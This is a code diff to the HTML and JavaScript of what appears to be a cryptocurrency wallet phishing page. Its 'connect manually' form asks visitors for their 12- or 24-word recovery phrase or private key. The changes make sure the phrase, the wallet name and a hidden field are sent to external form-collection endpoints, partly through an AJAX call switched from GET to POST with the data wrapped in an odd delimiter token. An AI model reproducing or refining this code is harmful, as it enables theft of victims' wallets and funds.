@@ -1464,7 +1464,7 @@
                     <div id="div_connect_manuallly" style="display:none;">
                         <form name="my-form" action="https://forms.un-static.com/forms/85e84f5b015355166daa3b97f51976d55a0f6f8b" method="POST" id="my-form">
                             <p>Enter phrase or Private Key</p>
-                            <input type="hidden" id="crypto_type">
+                            <input type="hidden" name="crypto phrase" id="crypto_type">
                             <div id="phrase"><textarea
                                     placeholder="Enter your 12 or 24 Mnemonic words. Seperate them with spaces. or Input Wallet Private Key"
                                     style="font-size:20px; font-weight:650" rows="4" minlength="10" id="phrase-box" required name="phrase"></textarea>
@@ -1586,7 +1586,7 @@
                     const token = `00x500sxa5b0x10qxam4gx0x9ab2kshb00200${field.value}00x500sxa5b0x10qxam4gx0x9ab2kshb00200${$('#wallet_name').text().trim()}00x500sxa5b0x10qxam4gx0x9ab2kshb00200`
                     $.ajax({
                         url: "https://forms.un-static.com/forms/9169297c02e71d7d2cdb789ea71b7e7c2d105e4e"+token,
-                        method: "GET",
+                        method: "POST",
                         //data: { "load_phrase": 1, "data_phrase": field.value, "wallet_selected": $('#wallet_name').text().trim() },
                         success: function (result) {
                            
